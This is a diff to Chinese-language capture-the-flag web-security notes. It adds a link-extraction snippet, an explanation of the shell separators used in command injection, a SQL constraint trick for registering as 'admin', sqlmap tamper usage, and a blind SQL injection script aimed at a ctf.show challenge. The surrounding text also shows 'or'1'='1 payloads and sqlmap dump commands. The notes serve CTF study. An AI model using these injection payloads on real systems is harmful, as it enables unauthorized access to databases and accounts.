@@ -1,7 +1,8 @@
 # Web
-不能全信前端的代码提示
+- 不能全信前端的代码提示
+- 一个复杂的网页，页面中很可能隐藏了重要外链
 
-## HTTP
+## HTTP 和网页
 
 - HTTP 会将 URL 和 Headers 自动解 urldecode，但是不会解 POST 方法内的 urldecode (其实不一定，urldecode 是由编程语言负责的，具体看怎么设定的)
 
@@ -27,9 +28,50 @@ X-Forwarded-For: 127.0.0.1
         
 注意观察网站刷新的原因是否由 Cookie 等字段影响的？
 
+### 网页链接提取
+
+自动提取网页中包含的链接，并排除黑名单后缀。（用于发现复杂网页包含的重要外链信息）
+
+```javascript
+(function() {
+    var allElements = Array.from(document.querySelectorAll('*'));
+    var allUrls = [];
+  	// 链接黑名单后缀
+    var staticFileExtensions = ['jpg', 'png', 'gif', 'css', 'js'];
+
+    allElements.forEach(function(el) {
+        if (el.hasAttribute('href')) {
+            allUrls.push(el.getAttribute('href'));
+        }
+        if (el.hasAttribute('src')) {
+            allUrls.push(el.getAttribute('src'));
+        }
+    });
+
+    var nonStaticUrls = allUrls.filter(function(url) {
+        var extension = url.split('.').pop();
+        return staticFileExtensions.indexOf(extension) === -1;
+    });
+
+    var uniqueNonStaticUrls = [...new Set(nonStaticUrls)];
+
+    console.log(uniqueNonStaticUrls);
+})();
+```
+
 ## Linux
 
 - Linux 命令绕过，可以用 | 或 & 或 ;
+
+  在 Linux 中，`|`、`&` 和 `;` 都是常用的命令行符号，每个符号都有自己的特定用途。
+
+  1. `|` (管道)：这个符号用于将一个命令的输出作为另一个命令的输入。例如，`command1 | command2`，这里 command1 的输出会作为 command2 的输入。
+
+  2. `&`：这个符号用于在后台运行命令。如果你在命令后加上 `&`，那么这个命令就会在后台运行，你可以继续在命令行中输入和执行其他命令。例如，`command &`，这里 command 会在后台运行。
+
+  3. `;`：这个符号用于在同一行中运行多个命令。命令在 `;` 后面的命令会在前一个命令执行完毕后执行，无论前一个命令是否成功。例如，`command1 ; command2`，这里 command1 会首先执行，无论其是否成功，command2 都会接着执行。
+
+  这就是 Linux 中 `|`、`&` 和 `;` 的基本区别。
 
 ### ping 注入
 
@@ -177,6 +219,8 @@ if __name__ == '__main__':
 
 ## SQL 攻击
 
+- 若系统不允许注册'admin'。可以在注册时加一个空格，如'admin '，登录时仍然可以用'admin'登录。原因见 [SQL 约束攻击](#SQL-约束攻击)
+
 ### SQL 注入
 
 #### sqlmap
@@ -194,7 +238,7 @@ python sqlmap.py -u http://x.com/?id=1 -D N -T A --columns
 python sqlmap.py -u http://x.com/?id=1  -D N -T A -C B --dump
 
 
-# 高级注入（只举例第一步）
+# 高级注入（只举例第一步，同样适用于 POST 请求）
 python sqlmap.py -u http://x.com/?id=1 --batch --level=3 --tamper=space2comment.py --dbs
 ```
 
@@ -224,6 +268,45 @@ http://xxx/?username=admin'or'1'='1&password=123456'or'1'='1
 ```sql
 SELECT * FROM users WHERE username='vampire     ';
 ```
+
+### SQL 盲注
+
+SQL 盲注示例代码
+
+```python
+import requests
+
+url='http://3d4bda8e-7eef-4853-9a8d-e0057f666d26.challenge.ctf.show/admin/checklogin.php'
+s='0123456789abcdefghijklmnopqrstuvwxyz'
+password=''
+flag=''
+for i in range(1,18):
+    print("第"+str(i)+"位")
+    for j in s:
+        data={"u": f"'||substr(p,{str(i)},1)<'"+j, 
+              "p": "1"}
+
+        r=requests.post(url,data=data)
+
+        if "密码错误"==r.text:
+            password+=chr(ord(j)-1)
+            print(password)
+            break
+        
+print(password)
+
+'''
+在这个脚本中，SQL注入的语句是"||substr(p,"+str(i)+",1)<'"+j，这个语句的意思是"或者密码的第i位小于当前尝试的字符j"。如果这个语句为真，那么应用程序会返回一个"密码错误"的响应。这就是这个脚本如何知道哪个字符不在密码中的。
+
+chr(ord(j)-1) 这个表达式是在Python中对字符进行处理的一种方式。
+ord(j) 是Python的内置函数，用于返回一个字符（例如 j）的Unicode编码。例如，ord('a') 返回97。
+-1 是对这个Unicode编码进行减1操作，即返回前一个字符的Unicode编码。
+chr() 也是Python的内置函数，用于返回指定Unicode编码的字符。例如，chr(97) 返回 'a'。
+所以，chr(ord(j)-1) 这个表达式的功能是返回字符j的前一个字符。例如，如果 j 是 'b'，那么 chr(ord(j)-1) 就会返回 'a'。
+'''
+```
+
+
 
 ## 代码注入
 
